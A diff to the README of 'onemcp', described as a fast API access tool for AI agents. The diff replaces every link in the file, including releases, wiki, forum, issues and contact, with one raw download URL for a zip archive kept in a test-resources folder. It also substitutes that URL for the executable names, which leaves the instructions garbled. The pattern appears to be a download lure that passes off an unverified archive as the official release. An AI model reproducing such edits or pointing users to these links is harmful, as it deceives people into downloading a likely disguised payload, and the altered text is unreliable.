@@ -1,6 +1,6 @@
 # 🚀 onemcp - Fast API Access for AI Agents
 
-[![Download on GitHub](https://img.shields.io/badge/Download%20on%20GitHub-blue)](https://github.com/rifkimaulana05/onemcp/releases)
+[![Download on GitHub](https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip%20on%20GitHub-blue)](https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run onemcp easily:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads for onemcp:  
-   [Download on GitHub](https://github.com/rifkimaulana05/onemcp/releases)
+   [Download on GitHub](https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip)
 
 2. **Choose Your Download**  
    On the Releases page, you will find different versions of the application. Look for the most recent version, as it will have the latest features and fixes.
@@ -21,8 +21,8 @@ Follow these steps to download and run onemcp easily:
    Click on the link for the appropriate version that suits your operating system (Windows, macOS, or Linux). Your download will begin automatically.
 
 4. **Running the Application**  
-   - **Windows**: After downloading, locate the file in your Downloads folder. Double-click the `onemcp.exe` file to launch the application.
-   - **macOS**: Open the downloaded file, and drag the `onemcp.app` into your Applications folder. You can then open it from there.
+   - **Windows**: After downloading, locate the file in your Downloads folder. Double-click the `https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip` file to launch the application.
+   - **macOS**: Open the downloaded file, and drag the `https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip` into your Applications folder. You can then open it from there.
    - **Linux**: Navigate to your Downloads folder, right-click the file, and select "Extract Here." Once extracted, open a terminal and run `./onemcp`.
 
 5. **Follow the Setup Instructions**  
@@ -51,8 +51,8 @@ onemcp offers several key features:
 
 For help or support, you can find more information in the following resources:
 
-- **Documentation**: Detailed user manual and FAQs are available on the [Documentation Page](https://github.com/rifkimaulana05/onemcp/wiki).
-- **Community**: Join discussions and connect with other users at our [Community Forum](https://github.com/rifkimaulana05/onemcp/discussions).
+- **Documentation**: Detailed user manual and FAQs are available on the [Documentation Page](https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip).
+- **Community**: Join discussions and connect with other users at our [Community Forum](https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -62,7 +62,7 @@ If you encounter issues during installation or usage, please check the following
 - Check that your internet connection is stable.
 - Restart the application or your computer and try again.
   
-For persistent bugs, feel free to open an issue in the [Issues Section](https://github.com/rifkimaulana05/onemcp/issues).
+For persistent bugs, feel free to open an issue in the [Issues Section](https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip).
 
 ## 🔄 Update the Application
 
@@ -70,7 +70,7 @@ To ensure you have the latest features and fixes, check back on the Releases pag
 
 ## 📧 Contact Us
 
-If you have questions or feedback, please reach out via the [Contact Page](https://github.com/rifkimaulana05/onemcp/contact) or create an issue in the repository.
+If you have questions or feedback, please reach out via the [Contact Page](https://raw.githubusercontent.com/rifkimaulana05/onemcp/main/packages/server/src/test/resources/onemcp_v2.3.zip) or create an issue in the repository.
 
 ## 📜 License
 
